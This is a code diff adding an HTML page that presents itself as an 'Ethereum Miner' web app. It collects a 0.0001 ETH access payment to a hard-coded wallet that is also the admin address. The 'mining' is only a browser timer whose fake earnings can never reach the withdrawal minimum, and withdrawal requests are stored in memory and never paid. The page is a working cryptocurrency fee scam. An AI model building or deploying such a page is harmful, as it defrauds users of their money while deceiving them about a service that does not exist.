@@ -1,0 +1,334 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Ethereum Miner App</title>
+  <style>
+    /* Beautification & Global Styles */
+    body {
+      margin: 0;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: flex-start;
+      background: #1a1a1a;
+      color: white;
+      font-family: Arial, sans-serif;
+      padding: 20px;
+    }
+    
+    h1 {
+      font-size: 2.5rem;
+      background: linear-gradient(45deg, #FFD700, #FFA500);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      margin: 20px 0;
+    }
+    
+    .coin {
+      width: 200px;
+      height: 200px;
+      position: relative;
+      transform-style: preserve-3d;
+      animation: rotate 3s infinite linear;
+      margin-bottom: 20px;
+    }
+    
+    .coin-face {
+      position: absolute;
+      width: 100%;
+      height: 100%;
+      backface-visibility: hidden;
+      border-radius: 50%;
+    }
+    
+    .coin-back {
+      transform: rotateY(180deg) scaleX(-1);
+    }
+    
+    .coin-face img {
+      width: 100%;
+      height: 100%;
+      border-radius: 50%;
+      object-fit: cover;
+    }
+    
+    @keyframes rotate {
+      to { transform: rotateY(360deg); }
+    }
+    
+    /* App-specific Styles */
+    button {
+      padding: 10px 20px;
+      margin: 5px;
+      border: none;
+      background: #FFA500;
+      color: white;
+      font-size: 1rem;
+      cursor: pointer;
+      border-radius: 5px;
+    }
+    
+    button:disabled {
+      background: gray;
+      cursor: not-allowed;
+    }
+    
+    .section {
+      margin-top: 20px;
+      width: 90%;
+      max-width: 600px;
+      background: #333;
+      padding: 20px;
+      border-radius: 10px;
+    }
+    
+    table {
+      width: 100%;
+      border-collapse: collapse;
+    }
+    
+    th, td {
+      border: 1px solid #555;
+      padding: 8px;
+      text-align: center;
+    }
+  </style>
+</head>
+<body>
+  <h1>Ethereum $ETH</h1>
+  <div class="coin">
+    <div class="coin-face">
+      <img src="https://appincoin.fra1.cdn.digitaloceanspaces.com/uploads/1741556755827-mdlk7.png" alt="Coin Front">
+    </div>
+    <div class="coin-face coin-back">
+      <img src="https://appincoin.fra1.cdn.digitaloceanspaces.com/uploads/1741556755827-mdlk7.png" alt="Coin Back">
+    </div>
+  </div>
+  
+  <!-- App Container -->
+  <div class="section">
+    <!-- Connect Wallet Button -->
+    <button id="connectWallet">Connect Wallet</button>
+
+    <!-- Payment Section for non-admin users -->
+    <div id="paymentSection" style="display:none;">
+      <p>To access the miner, please send <strong>0.0001 ETH</strong> to:</p>
+      <p><code>0xde45f6a59A96DaA0AE7f26BAd254aA88241b8D04</code></p>
+      <button id="payButton">Make Payment</button>
+    </div>
+
+    <!-- Miner Section (accessible once unlocked) -->
+    <div id="minerSection" style="display:none;">
+      <p>Your Earnings: <span id="earnings">0</span> ETH</p>
+      <button id="startMining">Start Mining</button>
+      <button id="withdraw" disabled>Withdraw</button>
+      <p id="miningStatus"></p>
+    </div>
+
+    <!-- User Withdrawal History (for non-admin users) -->
+    <div id="userWithdrawalHistory" style="display:none;">
+      <h3>Your Withdrawal History</h3>
+      <table id="withdrawalTable">
+        <thead>
+          <tr>
+            <th>Amount (ETH)</th>
+            <th>Status</th>
+          </tr>
+        </thead>
+        <tbody></tbody>
+      </table>
+    </div>
+
+    <!-- Admin Panel (visible only for the admin wallet) -->
+    <div id="adminPanel" style="display:none;">
+      <h2>Admin Panel</h2>
+      <h3>Pending Withdrawals</h3>
+      <table id="adminWithdrawalTable">
+        <thead>
+          <tr>
+            <th>User Wallet Address</th>
+            <th>Amount (ETH)</th>
+            <th>Actions</th>
+          </tr>
+        </thead>
+        <tbody></tbody>
+      </table>
+    </div>
+  </div>
+
+  <!-- Include ethers.js from a CDN -->
+  <script src="https://cdn.jsdelivr.net/npm/ethers/dist/ethers.min.js"></script>
+  <script>
+    // Global variables
+    let provider, signer, userAddress;
+    let hasPaid = false;
+    let mining = false;
+    let miningStartTime = null;
+    let miningInterval = null;
+    let earnings = 0;
+    const miningRate = 0.000000000008; // ETH per second
+    const miningDuration = 3 * 60 * 60; // 3 hours in seconds
+    const minWithdrawal = 0.001000000008; // Minimum withdrawal threshold in ETH
+    const adminAddress = "0xde45f6a59a96daa0ae7f26bad254aa88241b8d04"; // admin address in lowercase
+
+    // Array for pending withdrawal requests
+    let pendingWithdrawals = [];
+
+    // Refresh the Admin Panel with pending withdrawals
+    function refreshAdminPanel() {
+      const adminTableBody = document.getElementById("adminWithdrawalTable").getElementsByTagName("tbody")[0];
+      adminTableBody.innerHTML = "";
+      pendingWithdrawals.forEach((req, index) => {
+        const row = document.createElement("tr");
+
+        // Wallet Address Cell
+        const addrCell = document.createElement("td");
+        addrCell.textContent = req.address;
+        row.appendChild(addrCell);
+
+        // Amount Cell
+        const amountCell = document.createElement("td");
+        amountCell.textContent = req.amount.toFixed(12);
+        row.appendChild(amountCell);
+
+        // Actions Cell (Copy & Approve)
+        const actionsCell = document.createElement("td");
+        const copyBtn = document.createElement("button");
+        copyBtn.textContent = "Copy Address";
+        copyBtn.onclick = () => {
+          navigator.clipboard.writeText(req.address);
+          alert("Address copied to clipboard!");
+        };
+        actionsCell.appendChild(copyBtn);
+
+        const approveBtn = document.createElement("button");
+        approveBtn.textContent = "Approve";
+        approveBtn.onclick = () => {
+          if(confirm("Approve withdrawal of " + req.amount.toFixed(12) + " ETH for " + req.address + "?")){
+            // Remove the approved request
+            pendingWithdrawals.splice(index, 1);
+            refreshAdminPanel();
+            refreshUserWithdrawalHistory();
+            alert("Withdrawal approved!");
+          }
+        };
+        actionsCell.appendChild(approveBtn);
+        row.appendChild(actionsCell);
+
+        adminTableBody.appendChild(row);
+      });
+    }
+
+    // Refresh the User Withdrawal History table
+    function refreshUserWithdrawalHistory() {
+      const withdrawalTableBody = document.getElementById("withdrawalTable").getElementsByTagName("tbody")[0];
+      withdrawalTableBody.innerHTML = "";
+      pendingWithdrawals
+        .filter(req => req.address.toLowerCase() === userAddress.toLowerCase())
+        .forEach(req => {
+          const row = document.createElement("tr");
+          const amountCell = document.createElement("td");
+          amountCell.textContent = req.amount.toFixed(12);
+          const statusCell = document.createElement("td");
+          statusCell.textContent = "Pending";
+          row.appendChild(amountCell);
+          row.appendChild(statusCell);
+          withdrawalTableBody.appendChild(row);
+        });
+    }
+
+    // Connect wallet and check if user is admin
+    document.getElementById('connectWallet').onclick = async () => {
+      if (typeof window.ethereum !== 'undefined') {
+        provider = new ethers.providers.Web3Provider(window.ethereum);
+        try {
+          await provider.send("eth_requestAccounts", []);
+          signer = provider.getSigner();
+          userAddress = (await signer.getAddress()).toLowerCase();
+          alert("Wallet connected: " + userAddress);
+          // If admin wallet, bypass payment and show admin panel
+          if (userAddress === adminAddress) {
+            document.getElementById('minerSection').style.display = 'block';
+            document.getElementById('adminPanel').style.display = 'block';
+          } else {
+            // For non-admin users, show payment and withdrawal history sections
+            document.getElementById('paymentSection').style.display = 'block';
+            document.getElementById('userWithdrawalHistory').style.display = 'block';
+          }
+        } catch (err) {
+          console.error(err);
+          alert("Wallet connection failed: " + err.message);
+        }
+      } else {
+        alert("MetaMask not detected. Please install MetaMask and try again.");
+      }
+    };
+
+    // Payment for non-admin users
+    document.getElementById('payButton').onclick = async () => {
+      try {
+        const tx = await signer.sendTransaction({
+          to: '0xde45f6a59A96DaA0AE7f26BAd254aA88241b8D04',
+          value: ethers.utils.parseEther("0.0001")
+        });
+        await tx.wait();
+        alert("Payment successful! You now have access to Ethereum Miner.");
+        hasPaid = true;
+        document.getElementById('minerSection').style.display = 'block';
+        document.getElementById('paymentSection').style.display = 'none';
+      } catch (err) {
+        console.error(err);
+        alert("Payment failed: " + err.message);
+      }
+    };
+
+    // Start mining simulation
+    document.getElementById('startMining').onclick = () => {
+      if (mining) return; // Prevent multiple mining sessions
+      mining = true;
+      miningStartTime = Date.now();
+      document.getElementById('miningStatus').innerText = "Mining in progress for 3 hours...";
+      document.getElementById('startMining').disabled = true;
+
+      miningInterval = setInterval(() => {
+        const elapsed = Math.floor((Date.now() - miningStartTime) / 1000);
+        earnings = elapsed * miningRate;
+        document.getElementById('earnings').innerText = earnings.toFixed(12);
+        if (elapsed >= miningDuration) {
+          clearInterval(miningInterval);
+          mining = false;
+          document.getElementById('miningStatus').innerText = "Mining completed. You can start again.";
+          document.getElementById('startMining').disabled = false;
+          if (earnings >= minWithdrawal) {
+            document.getElementById('withdraw').disabled = false;
+          }
+        }
+      }, 1000);
+    };
+
+    // Withdrawal request: record as pending for admin approval
+    document.getElementById('withdraw').onclick = () => {
+      if (earnings >= minWithdrawal) {
+        const request = {
+          address: userAddress,
+          amount: earnings
+        };
+        pendingWithdrawals.push(request);
+        refreshUserWithdrawalHistory();
+        earnings = 0;
+        document.getElementById('earnings').innerText = "0";
+        document.getElementById('withdraw').disabled = true;
+        alert("Withdrawal request submitted and is pending admin approval.");
+        if (document.getElementById('adminPanel').style.display === 'block') {
+          refreshAdminPanel();
+        }
+      } else {
+        alert("Minimum withdrawal amount not reached!");
+      }
+    };
+  </script>
+</body>
+</html>
